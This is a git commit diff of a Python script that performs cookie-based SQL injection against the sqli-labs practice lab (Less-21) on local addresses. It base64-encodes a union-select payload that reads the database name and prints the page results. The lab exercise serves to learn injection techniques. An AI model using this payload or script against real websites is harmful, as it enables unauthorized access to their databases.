e0665b58bbf13632b4d30d0405ccab219e37d264
A-Huge-Cat <62644854+A-Huge-Cat@users.noreply.github.com>
2020-08-26 02:51:01 +0000

    Update CookieInjection.py

--- SQL注入/CookieInjection.py
+++ SQL注入/CookieInjection.py
@@ -1,9 +1,9 @@
-#-*- coding: UTF-8 -*-  
+#-*- coding: UTF-8 -*-#
+#!/usr/bin/python3#
 
 import requests
 from bs4 import BeautifulSoup
 import base64
-
 
 #爬虫的父类
 
@@ -12,8 +12,7 @@ class get_basic_information:
     def __init__(self,url,cookie):
         self.url=url
         self.cookie=cookie
-    
-    
+       
 class WebSpider(get_basic_information):
     def __init__(self,url,cookie):
         get_basic_information.__init__(self,url,cookie)
@@ -29,5 +28,50 @@ class WebSpider(get_basic_information):
         except:
             return "[+]     因为某些原因，你无法登录到这个网站"
 
-site=WebSpider("http://192.168.43.140/sqllab/Less-21/",{"uname":"YWRtaW4nKSB1bmlvbiBzZWxlY3QgMSwxLGRhdGFiYXNlKCkgbGltaXQgMSwxIw=="})
-print(site.login())
+# cookie加密器
+class CookieEncoder:
+    def __init__(self,cookie):
+        self.cookie=cookie
+
+    def encoder(self):
+        bytes_cookie=self.cookie.encode("utf-8")
+        cookie=base64.b64encode(bytes_cookie)
+
+        return str(cookie)
+
+
+class FindTarget:
+    def __init__(self,targetelement,cookie,url,special):
+        self.targetelement=targetelement
+        self.cookie=cookie
+        self.url=url
+        self.special=special
+
+    def showDate(self):
+
+        message=WebSpider(self.url,self.cookie).login().find_all(self.targetelement,self.special)
+        for element_value in message:
+            print("[+]      {}".format(element_value.text))
+
+
+basic_cookie_value=input("[+]      请输入这个原始cookie:")
+bs64_cookie=CookieEncoder(basic_cookie_value).encoder()
+print(bs64_cookie)
+
+
+"""
+web=FindTarget("font",
+                {"uname":" YWRtaW4nKSB1bmlvbiBzZWxlY3QgMSwxLGRhdGFiYXNlKCkgbGltaXQgMSwxIw="},
+                "http://127.0.0.1/sqllab/Less-21/",
+                {"color":"grey"})
+web.showDate()
+"""         
+
+
+
+
+
+
+
+# site=WebSpider("http://127.0.0.1/sqllab/Less-21/",{"uname":" YWRtaW4nKSB1bmlvbiBzZWxlY3QgMSwxLGRhdGFiYXNlKCkgbGltaXQgMSwxIw="})
+# print(site.login())
